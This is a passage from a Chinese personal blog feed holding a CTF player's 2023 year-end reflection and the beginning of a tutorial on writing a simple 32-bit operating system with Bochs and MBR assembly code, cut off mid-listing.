    <content type="html"><![CDATA[<p><strong>很多事，我能想通也能接受，但我很难过</strong></p><p>北京这几天又是雾霾，开始怀念大雪后那一抹干净的蔚蓝。走在路上，总有一种吸二手烟的抽象感</p><p>眨眼间2023也就剩最后一天了，看群友都在催年终总结（绷），也感觉确实有写一些东西的必要，来记录我这看似忙碌却又无为的一年</p><p>友情提示，笔者会尽可能减少抽象emoji的使用，但是，谁又能说的准呢🥺🥺🥺</p><h1 id="Technology"><a href="#Technology" class="headerlink" title="Technology"></a>Technology</h1><p>还记得2023的钟声，是在问狐师傅如何学heap中响起的</p><p>年初打了N1 junior &amp;&amp; hgame 2023，被摁在地上使劲摩擦，然后那段时间就是疯狂的刷题</p><p>好在西湖论剑的初赛没白给，虽然是道被打烂的orw，但第一次能在大比赛有输出，还是开心了好久。</p><p>最后山河哥哥差点把web A完了，带我们进了决赛。挺神奇的，为了打西湖临时凑的一支队伍，后来就变成校队了哈哈哈</p><p>打了VNCTF 2023，脑子铸币了，赛时只出了一道题，虽然赛后非预期了P桑出的南通录，but还是耻辱下场呜呜</p><p>怀着试试的心态给VN投了简历，面试的时候高版本的off by null直接歇逼（虽然现在也还是不看板子做不出来的FW，堆风水给爷死啊），最后e宝还是把我放了进去</p><p>后来开始学高版本的堆利用以及进阶知识，这边特别感谢<a href="https://www.roderickchan.cn/">roderick</a>师傅的传授！</p><p>期间经历了D3和阿里云这两重量级的小皮鞭拷打，道心彻底破碎了，然后不知道脑子抽风了还是什么，铸币笔者在4月份开始了kernel的学习</p><p>抱着A3👴的博客生啃了一个月，然后笔者就决定当逃兵了，kernel是一点没学会，A3👴这抽象emoji倒是学会了不少🤪（你说是吧）</p><p>学了点qemu escape、musl libc，但都是浅尝辄止，现在也都忘了差不多了，悲。但是还要感谢可爱男同eeee和pwn king嘉禾师傅能回答我一些有关qemu的问题</p><p>接着就是国赛了，初赛摸了个华北分区第七，太失败了。黑灯搏杀让👴大开眼界</p><p>华北是最早的举行分区赛的，6.10就打了好像。ylb奇特的break &amp; fix，出了三道pwn，没当战犯，最后有点小遗憾吧，拿了个二等奖，毕竟报名的时候是按解题赛模式组的。山河哥哥他们也拿到了去国决的门票，真的太成功了</p><p><img src="/img/2023zongjie/0.jpg"></p><p>国赛过后，渐渐发现自己好像已经厌倦了glibc，于是在Nameless👴的帮助下，我开始了Iot的学习</p><p>很幸运，在暑假拿到了三个CVE编号（CVE-2023-40915 &amp; CVE-2023-40041 &amp; CVE-2023-40042），很不幸，都是低质量水洞，且没有任何实际价值，totolink甚至连国区的技术支持邮箱都down了</p><p>你问我为什么暑假要学iot，是喜欢吗，可能有一点，毕竟是学二进制来第一次接触比较realworld的东西；但是更多的可能是对kernel和chrome的畏惧，终究是个懦夫罢了呜呜😭😭😭。</p><p>期间也浅浅的学习了fuzz，afl++，boo-fuzz，都摸过一点，最初的目的是想学习fuzz以此来自动化挖掘Iot固件，但后来也就不了了之了。</p><p>但是，fuzz真的是个intresting的idea，虽然我现在更多用这个idea来跑C++这种逆不出来的crash。</p><p>楽</p><p>在此感谢winmt王指导和Nameless👴在我学习Iot的过程中提供的帮助！</p><p>九月，终是开学。</p><p>当了校队22届的负责人，事是真的多</p><p>第一次带队去线下，羊城杯，耻辱战败，👴纯纯甲级战犯</p><p>后面又跑了陇剑和蓝帽半决赛，九月份差不多就把这个学期的比赛差旅经费花光了哈哈哈</p><p>国庆回来去参加了专项任务，回来又马不停蹄的举办了招新宣讲，等所有事都告一段落，已经快11月了</p><p>学期已经过半了</p><p>只能感叹：</p><p>​<strong>我荒废了时间，时间便把我荒废了</strong></p><p>专项学了C++，然后就开始给DAS月赛和新生赛出题，DAS那道shaopi真的对不起，给师傅们磕几个呜呜</p><p>说起DAS月赛，这是我们校队第一次举办哈哈，我和周哥还在题目了藏了彩蛋</p><p><img src="/img/2023zongjie/0.png"></p><p><del>S某和B某到底是谁呢？</del></p><p>11月份的几场线上又当战犯了，哎，其实有个别真的挺不想上线的，轩哥快毕业了很忙，能打pwn的就我一个</p><p>好在12月的强网没拖后腿，能做的都做了。但排名还是在32外面呜呜😭😭😭</p><p>哦忘了还有京麒线下，有个神奇的屌图</p><p><img src="/img/2023zongjie/1.jpg"></p><p>你问我们zopchain怎么做出来的，👴也不知道（小声逼逼，当时平台有bug，两道不同的题在1秒内提交flag，只要有一个flag对，两道题都会过check）</p><p>然后，就没有然后了</p><p>我自己也困惑这一年我到底在学什么，年初是heap到年末了好像也还是heap（说的就是你warm up !）</p><p>想了想，兜兜转转还是回到了kernel的起点</p><p>还是忘不了这classic的美学</p><p>md2024👴tm和kernerl只能活一个！</p><h1 id="Life"><a href="#Life" class="headerlink" title="Life"></a>Life</h1><p>今年最重要的事，当然是家里来了个小家伙</p><p><img src="/img/2023zongjie/2.jpg"></p><p>6个月大的小可爱</p><p><img src="/img/2023zongjie/3.jpg"></p><p>10个月大的10斤重的猪眯</p><p><img src="/img/2023zongjie/4.jpg"></p><p>猫猫天下第一！</p><p>7月份的时候，趁着大家在合肥打国决，和VN的小伙伴们面了基</p><p>见到了可爱南童e宝（这B是真娃娃脸啊），可爱温柔又帅气的tel哥哥，素质天花板大B老师，密码超人dbt，还有多很多大师傅</p><p>见识了eeee的究极嘴硬和都是水果的酒杯？（姑且算是酒杯不是水果杯吧）</p><p><img src="/img/2023zongjie/1.png"></p><p>哦，还有神奇的战败区，虽然没有战败CG就是了（差评，噫，我好像也在里面，哒咩！）</p><p><img src="/img/2023zongjie/2.png"></p><p>在去兰州的飞机上，拍了张挺感慨的照。或许这才是千沟万壑吧</p><p><img src="/img/2023zongjie/5.jpg"></p><p>师弟军训结束开断的电线杆，太残暴了</p><p><img src="/img/2023zongjie/6.jpg"></p><p>终于在北京等到了大雪，你说雪景啊还真不记得多少，倒是两个星期的不用早集合印象深刻，终于不是6：10起了妈妈生的</p><p>最黑暗的一集</p><p><img src="/img/2023zongjie/7.jpg"></p><p>从超市买东西回来随手拍的</p><p><img src="/img/2023zongjie/8.jpg"></p><p>还有什么值得回忆的点吗，或许还有吧</p><p>但需要刻意去想的，还叫回忆吗</p><h1 id="Love-0-o"><a href="#Love-0-o" class="headerlink" title="Love ??? 0.o"></a>Love ??? 0.o</h1><p>PASS！！！👴母胎solo19年，连女孩子的手都没牵过呜呜呜</p><p>以前一直奇怪winmt王指导怎么这么想找npy</p><p>没想到我也是小丑🤡🤡🤡🤡🤡🤡🤡</p><h1 id="Work"><a href="#Work" class="headerlink" title="Work"></a>Work</h1><p>转眼大二上就结束了，寒假找了份奇怪的实习（姑且可以这么说吧）</p><p>看看能不能在明年的暑假找一份正经的安全岗实习，或者去上海某中心打工</p><p>虽然未来大概率确定了，但是谁又知道呢🤔🤔🤔</p><p>或许是浙江网安太强，还是因为别的，一直没听到浙江有特招</p><p>但取证和渗透也该开始上手了，毕竟系统里二进制好像真不能当饭吃呜呜呜😭😭😭</p><h1 id="another-thing"><a href="#another-thing" class="headerlink" title="another thing"></a>another thing</h1><p>终究还是没有实力呜呜呜😭😭😭</p><p>明年就和kernel、取证、渗透死磕上了，虽然计划永远赶不上变化就是了</p><p>希望24国赛能保二争一下一吧，👴是真不想打这抽象比赛，但是👴想早点退休，不得不打。啊不对，👴怎么这么自信，万一华北分区寄了不是很尴尬🤔🤔🤔</p><p>尝试多打打国外赛，少一点利益，多一点乐趣，阿门</p><p>明年暑假想去一次北疆或者西藏，捞搭子呜呜</p><p>多出去走走，今年基本上假期都蜗着，我好像一年时间不算上出去比赛，只出了3次校（妈妈生的）。感觉已经是20岁的年龄，40岁的颈椎了呜呜😭😭😭</p><h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h1><p>感谢roderick师傅的无私教导</p><p>感谢winmt、Nameless、wjh、eeee、kortoriseed、P桑等大师傅在学习道路的帮助</p><p>感谢 V&amp;N 的小伙伴们，V&amp;N真的真的是个很棒的team！！！第一次在网络上找到了一个有归属感的地方</p><p>感谢校队0psu3中的每个人，这一年来收获了太多太多</p><p>感谢ice bag这个神奇的群聊中陪我吹水的6个二货</p><p>以及</p><p>感谢屏幕前的你抽出时间读完korey的碎碎念</p><h1 id="The-end"><a href="#The-end" class="headerlink" title="The end"></a>The end</h1><p><strong>凡是过去，皆为序章。</strong></p><p>于<del>百京大兴男子监狱</del>团河</p><p>2023.12.31</p>]]></content>
    
    
    <categories>
      
      <category>shell之外</category>
      
    </categories>
    
    
    <tags>
      
      <tag>碎碎念</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于作死试图搓一个32位操作系统不得不说的事</title>
    <link href="/2023/11/20/OS/"/>
    <url>/2023/11/20/OS/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0-写在一切之前"><a href="#0x0-写在一切之前" class="headerlink" title="0x0:写在一切之前"></a>0x0:写在一切之前</h1><p>本来在笔者的计划中，手搓一个简易的操作系统是在暑假就该完成的事情，结果笔者是只懒🐶，而且当时一直在搞fuzz和iot<del>（但好像也没搞出什么东西来，只是单纯的在摸鱼罢了）</del>。</p><p>然后呢笔者最近想重开kernel，静下心来好好学点内核。但掐指一算好像还有两个星期就到期末周了，学个🐕8</p><p>👴当🐓立断不如看点书，参考一下《操作系统真象还原》，基础能打一点是一点。</p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="bochs安装"><a href="#bochs安装" class="headerlink" title="bochs安装"></a>bochs安装</h3><p><a href="https://sourceforge.net/projects/bochs/files/bochs/">Bochs x86 PC emulator - Browse &#x2F;bochs at SourceForge.net</a></p><p>找个版本下载并解压</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">$ <span class="hljs-string">./configure</span> <span class="hljs-params">--prefix=/your/path/yo/bochs</span> <span class="hljs-params">--enable-debugger</span> <span class="hljs-params">--enable-disasm</span> <span class="hljs-params">--enable-iodebug</span> <span class="hljs-params">--enable-x86-debugger</span> <span class="hljs-params">--with-x</span> <span class="hljs-params">--with-x11</span><br>$ make<br>$ make install<br></code></pre></td></tr></table></figure><p><code>bochs</code>支持自带的<code>debug</code>和<code>gdb</code>（编译的时候-<code>-enable-debugger</code>变成<code>--enable-gdb-stub</code>），但gdb这适配做的是一坨shit，建议直接用<code>bochs</code>自带的</p><p>配置文件，抄的A3👴的呜呜，把<code>share/doc/bochs/bochsrc-sample.txt</code>里的改一改</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">megs: 32<br>romimage: <span class="hljs-attribute">file</span>=./bochs/share/bochs/BIOS-bochs-latest<br>vgaromimage: <span class="hljs-attribute">file</span>=./bochs/share/bochs/VGABIOS-lgpl-latest<br>ata0-master: <span class="hljs-attribute">type</span>=disk, <span class="hljs-attribute">mode</span>=flat, <span class="hljs-attribute">path</span>=<span class="hljs-string">&quot;img.img&quot;</span><br>cpu: <span class="hljs-attribute">model</span>=pentium, <span class="hljs-attribute">count</span>=1, <span class="hljs-attribute">ips</span>=50000000, <span class="hljs-attribute">reset_on_triple_fault</span>=1, <span class="hljs-attribute">ignore_bad_msrs</span>=1, <span class="hljs-attribute">msrs</span>=<span class="hljs-string">&quot;msrs.def&quot;</span><br><span class="hljs-comment"># following lines need to be added by yourself</span><br>keyboard: <span class="hljs-attribute">type</span>=mf, <span class="hljs-attribute">serial_delay</span>=250 <span class="hljs-attribute">keymap</span>=./bochs/share/bochs/keymaps/x11-pc-us.map<br><span class="hljs-comment">#sound: driver=default, waveout=/dev/dsp. wavein=, midiout= </span><br></code></pre></td></tr></table></figure><h3 id="bochs-调试"><a href="#bochs-调试" class="headerlink" title="bochs 调试"></a>bochs 调试</h3><p>大部分调试命令和gdb一样，有几个特殊的</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">show</span> mode:每次 CPU 变换模式时就提示，模式是指保护模式、实模式，比如从实模式进入到保护模式时会有提示<br><br><span class="hljs-keyword">show</span> <span class="hljs-type">int</span>:每次有中断时就提示 p 同时显示三种中断类型，这 三 种中断类型包括“ softint ”、“ extint ”和“ iret ”。可以单独显示某类中断，如执行 <span class="hljs-keyword">show</span> softint 只显示软件主动触发的中断， <span class="hljs-keyword">show</span> extint 则只显示来自外部设备的中断， <span class="hljs-keyword">show</span> iret 只显示 iretd 指令有关的信息 <br><br>reg：常用寄存器的值<br><br><span class="hljs-keyword">info</span> gdt/ldt/CPU/idt/ivt：全局符号描述表/局部符号描述表/所有CPU寄存器的值/显示中断向量表IDT/显示中断向量表IVT<br><br>sreg：查看段寄存器的值<br>dreg：查看调试寄存器的值<br>creg：查看控制寄存器的值<br></code></pre></td></tr></table></figure><h3 id="pack-start"><a href="#pack-start" class="headerlink" title="pack &amp; start"></a>pack &amp; start</h3><p>pack.sh</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">!/bin/bash<br>nasm -o ./mbr.bin ./mbr.S<br>./bochs/bin/bximage <span class="hljs-attribute">-mode</span>=create <span class="hljs-attribute">-hd</span>=60M <span class="hljs-attribute">-imgmode</span>=<span class="hljs-string">&quot;flat&quot;</span> -q ./img.img<br>dd <span class="hljs-attribute">if</span>=./mbr.bin <span class="hljs-attribute">of</span>=./img.img <span class="hljs-attribute">bs</span>=512 <span class="hljs-attribute">count</span>=1 <span class="hljs-attribute">conv</span>=notrunc<br></code></pre></td></tr></table></figure><p>start.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>./bochs/bin/bochs -f ./bochsrc.disk<br></code></pre></td></tr></table></figure><h1 id="0x1-开始调教MBR（bushi）🥵"><a href="#0x1-开始调教MBR（bushi）🥵" class="headerlink" title="0x1:开始调教MBR（bushi）🥵"></a>0x1:开始调教MBR（bushi）🥵</h1><h2 id="about-BIOS"><a href="#about-BIOS" class="headerlink" title="about BIOS"></a>about BIOS</h2><p>众所周知，当你按下神圣的开机键，<code>CPU</code>通上电之后以实模式启动，第一个运行的程序便是<code>BIOS</code>，<code>BIOS</code>将<code>MBR</code>载入，将控制权交给了<code>MBR</code></p><p>于是便产生了玄学三问：<code>BIOS</code>是什么？他从哪来？为什么他先执行？</p><p>首先先看张《操作系统真象还原》里的图，关于实模式下的内存分布</p><p><img src="/img/OS/0.png" alt="img"></p><p><code>BIOS</code>：<code>Basic Input &amp; Output System</code>即基本输入输出系统，主要工作便是检测、初始化硬件，还建立了伟大的中断向量表</p><p>但是通过图可知，<code>BIOS</code>才<code>0xf0000-0xfffff</code>共计<code>64KB</code>大小，不可能兼顾到所有的硬件设备，而且此时运行在实模式下，也没有这个必要，所以只要挑一些重要的，能保证计算机运行的基本硬件IO操作就行了。此为<code>BIOS</code>名称由来</p><p>至于<code>BIOS</code>在哪里，这玩意一直在主板上的<code>ROM</code>里，通电的时候<code>ROM</code>就被映射在<code>0xf0000-0xfffff</code>,只要访问了这里就算访问了<code>BIOS</code>,这个映射完全是由硬件完成的。</p><p>But <code>BIOS</code>也算是个程序，所以也是有入口的，此处便是<code>0xffff0</code>。电脑开机的一瞬间，CPU的<code>cs:ip</code>寄存器被赋值为<code>0xf000</code>:<code>0xfff0</code>。然后开机时处于实模式，段基址<code>cs</code>要左移四位，所以此时<code>cs:ip</code>等效地址为<code>0xffff0</code>，为<code>BIOS</code>入口。</p><p>但是<code>0xffff0-0xfffff</code>这短短的16字节显然并不能干什么，通过调试发现，<code>0xffff0</code>处的指令实为跳转指令，跳到<code>0xfe05b</code>处。这才是<code>BIOS</code>真正开始的地方</p><p><img src="/img/OS/1.png" alt="img"></p><p>当初始化硬件和建立中断向量表后，<code>BIOS</code>将自己最后的波纹用于检查0盘0道1扇区（实则是0盘0道0扇区，CHS表示方式中1扇区就是第一个扇区）最后两个字节是否为<code>magic number</code> <strong>0x55</strong>和<strong>0xaa</strong>（你问👴为什么不是114514这种恶臭的杂修~，👴知道个der，反正书里写了）。如果是，就会把这个扇区的<code>data</code>加载到<code>0x7c00</code>,随后跳转执行。此处执行的，便是MBR。如果你问完<code>magic number</code>又要问👴为什么是<code>0x7c00</code>,👴只能说是<code>IBM生产的PC5150的ROM BIOS 中的INT19H</code>的历史遗留问题，当时的<code>BIOS</code>按<code>32KB</code>的大小来设计，<code>32KB</code>就是<code>0x8000</code>，<code>MBR</code>的大小是512字节，同时作为一个程序需要使用栈，姑且算<code>1KB</code>好了。<code>1KB</code>是多少，<code>0x400</code>，所以<code>0x8000</code> - <code>0x400</code>是<code>0x7c00</code>。</p><h2 id="MBRの初次调教"><a href="#MBRの初次调教" class="headerlink" title="MBRの初次调教"></a>MBRの初次调教</h2><p>写了这么多终于到<code>MBR</code>了，妈妈生的</p><p><code>MBR（Master Boot Recode）</code>——主引导记录，是我们能最早支配的程序，因为<code>BIOS</code>这byd是写死的。</p><p>需要注意的是，MBR的大小必须是512字节，因为只有这样才能保证0道0盘1扇区的最后两个字节为<code>magic</code>。</p><p>先写一个在屏幕上输出字符的<code>MBR</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SECTION MBR vstart=0x7c00    ;因为MBR被加载到0x7c00，所以将整个code作为section，并将vstart赋值0x7c00，这样计算绝对地址时就会以0x7c00为base<br>mov ax,cs                ;段寄存器不能用立即数，只能通过寄存器或者内存进行赋值<br>mov ds,ax<br>mov es,ax<br>mov ss,ax<br>mov fs,ax<br>mov sp,0x7c00<br><br>mov ax,0x600             ;上卷全部行，清屏<br>mov bx,0x700<br>mov cx,0                 ;左上角（0，0）<br>mov dx,0x184f          ;右下角（80，25）<br>int 0x10                 ;BIOS提供的0x10中断<br><br> mov ah,3                 ;获取光标位置<br>mov bh,0<br>int 0x10<br><br>mov ax,message           ;es:bp是字符串地址，因为前面es已经被初始化，所以cs=es<br>mov bp,ax<br><br>mov cx,0x20              ;length <br>mov ax,0x1301            ;ah:01 显示字符串，光标跟随移动<br>mov bx,0x2               ;bl:02 黑底绿字<br>int 0x10 <br><br>jmp $                    ;$表示当前行，程序在这边卡住<br><br>message db &quot;The First MBR of Korey0sh1&quot;<br> times 510-($-$$) db 0    ;$$表示section的位置，填充510的length，补上magic number<br>db 0x55,0xaa   <br></code></pre></td></tr></table></figure><p>运行后可以康康</p><p><img src="/img/OS/2.png" alt="img"></p><p>输出的时候写了个循环，优化一下，不用算length了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SECTION MBR vstart=0x7c00<br>mov ax,cs<br>mov ds,ax<br>mov es,ax<br>mov ss,ax<br>mov fs,ax<br>mov sp,0x7c00<br><br>mov ax,0x600<br>mov bx,0x700<br>mov cx,0<br>mov dx,0x184f<br>int 0x10<br><br>mov ax,message<br>mov bp,ax<br><br>.korey_print:<br><br> mov ah,3<br>mov bh,0<br>int 0x10<br><br>mov cx,1<br>mov ax,0x1301<br>mov bx,0x2<br>int 0x10<br>        <br>    inc bp<br>    mov ax,[bp]<br>    test ax,ax<br>    jnz .korey_print<br>       <br>jmp $<br><br>message db &quot;The First MBR of Korey0sh1&quot;<br> times 510-($-$$) db 0<br>db 0x55,0xaa<br></code></pre></td></tr></table></figure><h2 id="变成显存形状的MBR"><a href="#变成显存形状的MBR" class="headerlink" title="变成显存形状的MBR"></a>变成显存形状的MBR</h2><p>前面的<code>MBR</code>，使用<code>BIOS</code>提供的0x10中断完成了字符输出，说实话还是依赖于中断向量表。</p><p>But，中断向量表只存在于实模式，以后还是要进入保护模式的捏，但保护模式就莫得中断向量表了，也就无法使用int 0x10来完成输出了。</p><p>那该怎么办捏</p><p>答案就是直接对显卡上手。</p><p>显卡显卡，就是用来图像输出的卡。而显卡中的显存，是显卡提供给我们的接口。关于实模式的内存分布中提到<code>0xA0000</code>-<code>0xC7FFF</code>是显存的区域，事实上，当你直接在显存上写东西。显卡便会在屏幕上输出内容</p><p><img src="/img/OS/3.png" alt="img"></p><p>下面是在显存文本模式区域（一个字节表示输出字符，一个字符表示其属性）输出<code>“korey&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SECTION MBR vstart=0x7c00<br>mov ax,cs<br>mov ds,ax<br>mov es,ax<br>mov ss,ax<br>mov fs,ax<br>mov sp,0x7c00<br>mov ax,0xb800<br>mov gs,ax<br><br>mov ax,0x600<br>mov bx,0x700<br>mov cx,0<br>mov dx,0x184f<br>int 0x10<br><br>mov byte [gs:0x00],&#x27;k&#x27;<br>mov byte [gs:0x01],0xa4   ;A：背景色绿色   4：前景色红色<br><br>mov byte [gs:0x02],&#x27;o&#x27;<br>mov byte [gs:0x03],0xa4<br><br>mov byte [gs:0x04],&#x27;r&#x27;<br>mov byte [gs:0x05],0xa4<br><br>mov byte [gs:0x06],&#x27;e&#x27;<br>mov byte [gs:0x07],0xa4<br><br>mov byte [gs:0x08],&#x27;y&#x27;<br>mov byte [gs:0x09],0xa4<br><br>jmp $<br><br> times 510-($-$$) db 0<br>db 0x55,0xaa<br></code></pre></td></tr></table></figure><p><img src="/img/OS/4.png" alt="img"></p><h2 id="MBR-和我交往吧，磁盘仙贝！😋"><a href="#MBR-和我交往吧，磁盘仙贝！😋" class="headerlink" title="MBR:和我交往吧，磁盘仙贝！😋"></a>MBR:和我交往吧，磁盘仙贝！😋</h2><p><code>BIOS</code>只能把0柱面0磁道1扇区512字节大小的<code>MBR</code>载入内存，那么问题来了，<code>MBR</code>执行完了，然后干什么嘞。</p><p>其实我们都知道，<code>MBR</code>也不过是一个中继程序而已，然既然<code>MBR</code>是从磁盘导入的，那我们能不能用<code>MBR</code>从磁盘导入别的<code>data</code>呢？</p><p>这就涉及到磁盘通信问题惹</p><p>先贴一张表，出自《操作系统真象还原》</p><p><img src="/img/OS/5.png" alt="img"></p><p>先来看看一些常用的端口</p><ul><li>data <code>0x1f0/0x170</code>：负责管理数据，唯一一个16位的</li><li>error&#x2F;feature <code>0x1f1/0x171</code>：读取硬盘失败时记录失败信息&#x2F;写入硬盘时存储命令需要的额外参数</li><li>Sector count <code>0x1f2/0x172</code>：指定待写入或待读取的扇区</li><li>device <code>0x1f6/0x176</code>：杂项寄存器，什么功能都带点。图来自《操作系统真象还原》</li><li><img src="/img/OS/6.png" alt="img"></li><li>status （读硬盘时）<code>0x17f/0x177</code>：状态寄存器。图来自《操作系统真象还原》</li><li><img src="/img/OS/7.png" alt="img"></li><li>command（写硬盘时）<code>0x17f/0x177</code>：储存让硬盘执行的命令。常用的就三个</li><li>identify: 0xEC 硬盘识别<br>read sector: 0x20 读取扇区<br>write sector: 0x30 写入扇区</li></ul><p>在物理层面上，硬盘内寻址是通过”柱面．磁头．扇区”来定位的<code>Cylinder Head Sector</code>，简称为 <code>CHS</code> ，这对读写的磁头很形象，但对于可爱的<code>MBR</code>小姐就太抽象了。于是出现了<code>LBA</code>，逻辑块地址<code>（logic block address）</code>，不考虑扇区所在的物理结构。</p><p>LBA又分LBA28（最大支持128G）和LBA48（最大支持128PB），我们这边就讨论LBA28</p><p>所以三个8位的寄存器存放<code>LBA28</code>的低24位，高4位存放在<code>device</code>寄存器的低4位</p><p>在<code>x86</code>架构中，与<code>IO</code>设备通信时一般会用<code>in/out</code>这两个指令，从端口读出数据或者向端口写入数据。并且默认<code>dx</code>寄存器存储端口号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov dx,0x1f0<br>in dx,al         ;这样就是向0x1f0端口写入al的值了<br></code></pre></td></tr></table></figure><p>至于如何从磁盘读入数据写入内存的大致步骤笔者就不赘述了，可以参考书籍</p><p>下面就是代码罢了</p><p>boot.inc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs assembly">LOADER_BASE_ADDR equ 0x900            ;0x500-0x7bff都是可用区域<br>LOADER_START_SECTOR equ 0x2           ;扇区2<br>%include &quot;boot.inc&quot;<br>SECTION MBR vstart=0x7c00<br>mov ax,cs                         ;initial<br>mov ds,ax<br>mov es,ax<br>mov ss,ax<br>mov fs,ax<br>mov sp,0x7c00<br>mov ax,0xb800<br>mov gs,ax<br><br>mov ax,0x600                      ;通过上卷清空屏幕<br>mov bx,0x700<br>mov cx,0<br>mov dx,0x184f<br>int 0x10<br><br>mov eax,LOADER_START_SECTOR       ;eax = 2<br>mov bx,LOADER_BASE_ADDR           ;bx = 0x900<br>mov cx,1                          ;待读取扇区数 = 1<br>call rd_disk_m_16<br><br>jmp LOADER_BASE_ADDR<br><br>rd_disk_m_16:<br>mov esi,eax                       ;保存参数<br>mov di,cx<br> <br>mov dx,0x1f2                      <br>mov al,cl         <br>out dx,al                         ;传个sector count 待读取扇区数为1<br><br>mov eax,esi<br><br>mov dx,0x1f3<br>out dx,al                         ;LAB low<br><br>mov cl,8<br>shr eax,cl<br>mov dx,0x1f4<br>out dx,al                         